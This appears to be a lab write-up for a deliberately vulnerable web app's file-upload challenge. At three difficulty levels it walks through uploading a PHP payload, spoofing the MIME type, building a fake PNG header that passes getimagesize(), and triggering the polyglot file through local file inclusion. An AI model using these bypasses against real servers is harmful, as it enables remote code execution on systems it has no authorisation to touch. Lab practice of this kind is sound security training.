# File Upload

Objective

Execute any PHP function of your choosing on the target system (such as
phpinfo() or system()) thanks to this file upload vulnerability.

## low

No filter present, could pass this level with a simple php file:  
```php
<?php
  phpinfo();
?>
```

## medium

This level only accepts JPEG (image/jpeg) or PNG (image/png) files.  
HTTP has no idea what the actual type of our payload is. There's an additional 
header called "Content-Type", which provides MIME type of the file to the
server.

Part of our POST request looks like this:  
```
Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: application/x-php

<?php phpinfo(); ?>
```

Modify `application/x-php` to `image/jpeg` and our php file should pass the
check.

## high (technique)

Our trick in the medium level loses its effect this time . This level would 
check file extension by `substr()` and verify image type by testing the output 
of `getimagesize()`.

Unfortunately we have to upload something that is not a php, which we can't
trigger by a GET request.
However, hidding some php in the png file seems possible and in order to do
that we have to bypass `getimagesize()`.

First generate a dummy PNG file header with nasm:  
```asm
; Fake_PNG.asm
; compile with
; nasm -f bin -o PNG.bin Fake_PNG.asm
section .data
  magic db 0x89, "PNG", 0x0d, 0x0a, 0x1a, 0x0a
  ihdr_length db 0, 0, 0, 13
  ihdr db "IHDR"
```

Then concat it with some php:  
`echo -n "<?php phpinfo();?>" | cat PNG.bin - > dump.png`  
Any two 4-byte data after IHDR would be interpreted as image width and image 
height, which is just what `getimagesize()` requires.

Upload it and you'll see the success prompt "../../hackable/uploads/dump.png 
succesfully uploaded!".

## high (practice)

As I mentioned above, we need to link in the file inclusion challenge.

Since our nicely crafted png file is successfully uploaded, We can trigger it
using local file inclusion (LFI).  
Send GET request `?page=file:///var/www/html/hackable/uploads/dump.png` to
`/vulnerabilities/fi/` and you'll soon get a php info webpage.
